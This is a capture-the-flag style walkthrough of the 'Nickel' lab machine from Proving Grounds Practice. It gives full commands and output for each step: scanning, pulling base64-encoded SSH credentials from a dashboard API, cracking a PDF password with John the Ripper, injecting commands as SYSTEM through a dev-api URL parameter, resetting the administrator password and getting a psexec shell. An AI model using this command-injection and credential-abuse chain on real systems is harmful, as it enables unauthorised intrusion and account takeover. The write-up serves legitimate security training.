# **Nickel | PG Practice**

- Running our nmap scan we have;

```bash
# Nmap 7.94SVN scan initiated Fri Aug  9 07:10:17 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.220.99
Warning: 192.168.220.99 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.220.99
Host is up (0.16s latency).
Not shown: 65287 closed tcp ports (conn-refused), 231 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Supported Methods: GET
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2024-08-09T06:14:33+00:00
|_ssl-date: 2024-08-09T06:15:45+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=nickel
| Issuer: commonName=nickel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-01T20:35:07
| Not valid after:  2025-01-31T20:35:07
| MD5:   7f74:ba8a:e678:ea4e:dd76:1c9e:788f:906d
|_SHA-1: bba7:61db:e4e5:2b29:7c06:9b41:113a:cd18:0f9c:7b88
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET
|_http-favicon: Unknown favicon MD5: 9D1EAD73E678FA2F51A70A933B0BF017
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-favicon: Unknown favicon MD5: 76C5844B4ABE20F72AA23CBE15B2494E
|_http-server-header: Microsoft-HTTPAPI/2.0
| http-methods: 
|_  Supported Methods: GET POST
|_http-title: Site doesn't have a title.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-08-09T06:14:33
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug  9 07:15:47 2024 -- 1 IP address (1 host up) scanned in 330.21 seconds
```



- No anonymous access on the FTP port 21

```bash
❯ ftp 192.168.220.99
Connected to 192.168.220.99.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (192.168.220.99:sec-fortress): anonymous
331 Password required for anonymous
Password: 
530 Login or password incorrect!
ftp: Login failed
ftp> 
```



- Navigating to port 80/HTTP we don't have anything useful, however checking port 8089 we have this page;


![image](https://github.com/user-attachments/assets/11ef110e-9928-483d-bd5b-bf08863e5012)



- Clicking on each of this options take time to load and for some reasons it is not even coming up, so i decided to view source code and discovered that another IP was been called on the endpoints, instead of our present target IP



```bash
❯ curl http://192.168.220.99:8089/
<h1>DevOps Dashboard</h1>
<hr>
<form action='http://169.254.127.78:33333/list-current-deployments' method='GET'>
<input type='submit' value='List Current Deployments'>
</form>
<br>
<form action='http://169.254.127.78:33333/list-running-procs' method='GET'>
<input type='submit' value='List Running Processes'>
</form>
<br>
<form action='http://169.254.127.78:33333/list-active-nodes' method='GET'>
<input type='submit' value='List Active Nodes'>
</form>
<hr>
```



- Decided to change it to our own IP in which port 33333/HTTP is currently opened also, The two endpoints hence `/list-running-procs` has the message "**Not Implemented**".



![image](https://github.com/user-attachments/assets/9b6ec01e-2834-469b-b7fd-6ed820e2be45)



> Seems like the above message means we have to use the `POST` request instead of `GET`, you can use `burpsuite` for this or `curl` using the `-X` parameter. However i will be using `burpsuite`



- I found hardcoded SSH credentials in response after changing request to `POST`



![image](https://github.com/user-attachments/assets/9e856ca9-0c88-49f6-bc6a-de76d50d47d0)



- Took me some time to figure out the password was encrypted with `base64` so we have to decode that also



```bash
❯ echo "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" | base64 -d
NowiseSloopTheory139
```



- Then we can now login via SSH with the credentials we have at hand `ariah:NowiseSloopTheory139`



```bash
❯ ssh ariah@192.168.220.99                          
ariah@192.168.220.99's password: 
Microsoft Windows [Version 10.0.18362.1016]
(c) 2019 Microsoft Corporation. All rights reserved.

ariah@NICKEL C:\Users\ariah>
```



- Navigating to `C:\ftp` i found a PDF file called `Infrastructure.pdf`, Then decided to transfer the file using the `scp` utility



```bash
❯ scp ariah@192.168.220.99:C:/ftp/Infrastructure.pdf ./
ariah@192.168.220.99's password: 
Infrastructure.pdf                                                                                                                                                                100%   45KB  59.4KB/s   00:00    

❯ ls
 Infrastructure.pdf   nmap.txt
```



- However this file is password encrypted so we have to decrypt it first



![image](https://github.com/user-attachments/assets/a154bee0-58ef-4834-b6a7-94a33e0c900f)





- However this shouldn't be an hassle, we can crack this using `JtR`



```bash
❯ pdf2john Infrastructure.pdf > hash.txt
                                                                                                                                                                                                                    
❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ariah4168        (Infrastructure.pdf)     
1g 0:00:02:42 DONE (2024-08-09 10:10) 0.006164g/s 61666p/s 61666c/s 61666C/s arial<3..ariadne01
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed. 
```



- Opening the PDF and checking the content we have several endpoints



![image](https://github.com/user-attachments/assets/94b577aa-f61a-4b5d-95da-9b352adb07af)



- Checking the endpoints locally, the `http://nickel/` endpoint looks interesting the most, so i checked it first and the body contains a message saying "`dev-api`"



```powershell
ariah@NICKEL c:\ftp>curl http://nickel/?
<!doctype html><html><body>dev-api started at 2024-08-02T13:35:17
                                               
        <pre></pre>
</body></html>
```



- Adding the "`dev-api`" as a parameter to the legit URL i have this error like a normal CMD error, Meaning it executes whatever commands we add there

```powershell
ariah@NICKEL c:\ftp>curl http://nickel/?dev-api
<!doctype html><html><body>dev-api started at 2024-08-02T13:35:17

        <pre>
Error while executing 'dev-api'

The term 'dev-api' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is c
orrect and try again.</pre>
</body></html>
```



- Decided to do this with the command `whoami`, and we have a response in return as the user administrator



```powershell
ariah@NICKEL c:\ftp>curl http://nickel/?whoami
<!doctype html><html><body>dev-api started at 2024-08-02T13:35:17

        <pre>nt authority\system
</pre>
</body></html>
```



- We can then change the administrator password and login as the administrator user with `psexec.py`



```powershell
ariah@NICKEL c:\ftp>curl http://nickel/?net%20user%20administrator%20password
<!doctype html><html><body>dev-api started at 2024-08-02T13:35:17

        <pre>The command completed successfully.

</pre>
</body></html>
ariah@NICKEL c:\ftp>

```



```bash
❯ psexec.py administrator@192.168.160.99
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 192.168.160.99.....
[*] Found writable share ADMIN$
[*] Uploading file YbakDYkh.exe
[*] Opening SVCManager on 192.168.160.99.....
[*] Creating service SBOk on 192.168.160.99.....
[*] Starting service SBOk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.18362.1016]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

